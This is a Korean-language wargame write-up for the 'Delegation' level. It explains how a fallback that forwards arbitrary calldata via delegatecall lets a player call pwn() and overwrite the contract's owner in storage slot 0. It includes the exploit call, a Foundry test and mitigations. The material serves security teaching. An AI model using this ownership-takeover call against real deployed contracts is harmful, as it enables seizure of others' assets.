# 06. Delegation

[English](../en/06_Delegation.md) | [한국어](06_Delegation.md)

## 문제 목표

`Delegation` 컨트랙트의 소유권을 가져옵니다.

## 핵심 개념

- `delegatecall`
- fallback 함수
- 함수 selector와 calldata
- 스토리지 레이아웃 호환성
- 유지되는 `msg.sender`

## 컨트랙트 분석

`Delegation`은 정의되지 않은 함수 호출을 모두 `Delegate`로 전달합니다.

```solidity
fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
        this;
    }
}
```

구현 컨트랙트에는 호출자를 소유자로 지정하는 함수가 있습니다.

```solidity
function pwn() public {
    owner = msg.sender;
}
```

`delegatecall`은 `Delegate`의 코드를 `Delegation`의 스토리지 문맥에서 실행합니다. 원래 호출자도 유지하므로 위임 실행된 `pwn()` 내부의 `msg.sender`는 계속 플레이어입니다.

두 컨트랙트 모두 `owner`를 스토리지 슬롯 0에 배치합니다. 따라서 `Delegate.owner`에 값을 쓰도록 컴파일된 대입문이 실제로는 `Delegation`의 슬롯 0을 변경하여 대상의 소유자를 교체합니다.

## 풀이 흐름

플레이어가 `pwn()` selector를 포함한 calldata를 `Delegation`에 전송합니다.

```solidity
address(delegation).call(abi.encodeWithSelector(Delegate.pwn.selector));
```

`Delegation`에는 `pwn()`이 정의되어 있지 않으므로 fallback이 실행되고 같은 calldata를 `delegatecall`로 전달합니다.

```text
플레이어가 pwn() selector로 Delegation 호출
        ↓
Delegation.fallback() 실행
        ↓
delegatecall로 Delegate.pwn() 코드 실행
        ↓
msg.sender는 계속 플레이어
        ↓
Delegation의 슬롯 0에 플레이어 주소 저장
        ↓
Delegation.owner == player
```

## Foundry 테스트

테스트는 프록시 상태만 변경되고 구현 컨트랙트의 상태는 그대로인지 함께 검증합니다.

```solidity
vm.prank(player);
(bool success,) = address(delegation).call(
    abi.encodeWithSelector(Delegate.pwn.selector)
);

assertTrue(success);
assertEq(delegation.owner(), player);
assertEq(delegate.owner(), initialDelegateOwner);
```

`abi.encodeWithSelector(Delegate.pwn.selector)`를 사용하면 selector가 컴파일된 함수 선언과 연결되므로 수동 문자열을 관리할 필요가 없습니다.

## 취약점의 근본 원인

fallback이 호출자가 제어하는 임의의 calldata를 제한 없이 구현 컨트랙트에 위임합니다. 구현 컨트랙트의 스토리지 레이아웃이 전달 컨트랙트의 보안상 중요한 상태와 겹치므로 공개 함수가 소유권을 덮어쓸 수 있습니다.

fallback은 위임 호출 실패 시 revert 데이터도 전달하지 않아 호출자가 실패 원인을 확인하기 어렵습니다.

## 권장 완화 방법

- 안전하지 않은 공개 함수를 가진 구현 컨트랙트에 임의의 calldata를 위임하지 않습니다.
- 업그레이드와 권한 작업에 명시적인 접근 제어를 적용합니다.
- 프록시와 구현 컨트랙트의 스토리지 레이아웃을 의도적으로 호환되게 관리합니다.
- 검증된 프록시 표준과 감사된 라이브러리를 사용합니다.
- 위임 호출이 실패하면 revert 데이터를 호출자에게 전달합니다.
- 프록시 상태 변경과 구현 컨트랙트 상태 유지 여부를 함께 테스트합니다.

## 테스트 실행

```bash
forge test --match-path test/06_Delegation.t.sol -vvv
```

전체 delegatecall 추적을 확인하려면:

```bash
forge test --match-path test/06_Delegation.t.sol -vvvv
```

## 학습 정리

`delegatecall`은 다른 컨트랙트의 코드를 빌리지만 호출 컨트랙트의 호출자, 잔액, 스토리지를 유지합니다. 안전한 설계에서는 노출되는 calldata와 스토리지 레이아웃을 접근 권한 모델의 일부로 다뤄야 합니다.
